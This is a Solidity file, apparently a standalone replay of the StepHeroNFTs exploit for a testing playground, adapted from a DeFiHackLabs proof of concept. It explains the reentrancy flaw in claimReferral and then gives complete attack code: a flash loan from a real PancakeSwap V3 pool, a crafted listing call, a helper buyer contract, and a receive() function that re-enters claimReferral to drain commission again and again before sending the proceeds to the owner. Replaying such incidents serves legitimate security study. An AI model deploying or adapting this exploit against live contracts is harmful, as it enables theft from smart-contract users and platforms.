// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Synthetic standalone exploit for the EVM Playground (2025-02-StepHeroNFTs).
//
// The DeFiHackLabs PoC (test/StepHeroNFTs_exp.sol) never calls a single
// post-deploy entrypoint: the whole attack chain fires INSIDE the
// `AttackerC` constructor (`testPoC()` just does `new AttackerC(attacker)`),
// which itself deploys `AttackerC1` and calls `attC1.attack(to)` — there is
// no `attack()`/`exploit()` function to invoke on an already-deployed
// contract. See scripts/poc-configs/README.md "syntheticExploit". This file
// collapses that constructor-triggered chain into a single `run()`
// entrypoint on one contract (`StepHeroNFTsDrain`), copying the three
// original contracts' logic (AttackerC / AttackerC1 / AttackerC2) verbatim,
// inlining minimal interfaces so it compiles with no imports.
//
// Root cause: StepHeroNFTs.claimReferral() pays the caller's referral
// balance via a plain native-BNB `call` BEFORE zeroing the referral ledger
// entry (a classic Checks-Effects-Interactions violation). Because the
// caller is the attacker's own contract, its `receive()` re-enters
// `claimReferral()` and is paid the SAME 3 BNB commission again and again
// until the reentrant call runs out of gas (56 times in this replay).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address dst, uint256 wad) external returns (bool);
}

interface IWETH {
    function withdraw(uint256 wad) external;
    function deposit() external payable;
}

interface IUniPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IStepHeroNFTs {
    function buyAsset(uint256 _id, uint256 amount, address tokenBuyer) external payable;
    function claimReferral(address) external;
}

address constant PANCAKE_V3_POOL = 0x172fcD41E0913e95784454622d1c3724f546f849;
address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant STEP_HERO_NFTS = 0x9823E10A0bF6F64F59964bE1A7f83090bf5728aB;

// Mirrors the original AttackerC1: initiates the flash loan and receives the
// PancakeV3 flash callback that runs the entire attack.
contract StepHeroNFTsDrain {
    address public immutable owner_;

    constructor(address owner) {
        owner_ = owner;
    }

    // Recorded entrypoint. Mirrors `new AttackerC(attacker)` -> `new AttackerC1()` -> `attC1.attack(to)`.
    function run() external {
        IUniPairV3(PANCAKE_V3_POOL).flash(address(this), 0, 1000 ether, abi.encode(owner_));
    }

    function pancakeV3FlashCallback(uint256, uint256 fee1, bytes calldata data) external {
        uint256 loanAmount = IERC20(WBNB).balanceOf(address(this));
        IWETH(WBNB).withdraw(loanAmount);

        // Selector 0xded4de3a: privileged/signed listing creation on behalf
        // of the caller — creates listing id 81122 (token 2008, amount 6,
        // price 1000 BNB) and credits a referral entry. Args reconstructed
        // verbatim from the historical calldata (unverified contract).
        STEP_HERO_NFTS.call(
            abi.encodeWithSelector(
                bytes4(0xded4de3a),
                address(this),
                2008, // id
                6, // amount
                6, // amount
                loanAmount,
                bytes32(0),
                block.timestamp,
                18766392275824
            )
        );

        StepHeroNFTsBuyer buyer = new StepHeroNFTsBuyer();
        buyer.attack{value: loanAmount}();

        // First claimReferral call pays out the 3 BNB commission via a
        // plain `call` BEFORE zeroing the ledger entry — receive() below
        // re-enters and drains it 56 more times.
        IStepHeroNFTs(STEP_HERO_NFTS).claimReferral(address(0));

        IWETH(WBNB).deposit{value: loanAmount + fee1}();
        IERC20(WBNB).transfer(PANCAKE_V3_POOL, loanAmount + fee1);

        (address to) = abi.decode(data, (address));
        payable(to).transfer(address(this).balance);
    }

    // Some NFT flavors on the listing check this before transfer.
    function safeTransferFrom(address, address, uint256, uint256, bytes memory) external {}

    receive() external payable {
        if (msg.sender == STEP_HERO_NFTS && msg.value == 3 ether) {
            try IStepHeroNFTs(STEP_HERO_NFTS).claimReferral(address(0)) {
                // continue re-entering; loop unwinds via the try/catch below
                // once the marketplace's BNB balance runs dry.
            } catch {
                return;
            }
        }
    }
}

// Mirrors the original AttackerC2: buys 1 unit of the freshly-created
// listing, which is what credits the referral commission on the drain
// contract in the first place.
contract StepHeroNFTsBuyer {
    function attack() external payable {
        IStepHeroNFTs(STEP_HERO_NFTS).buyAsset{value: 1000 ether}(81122, 1, msg.sender);
    }
}
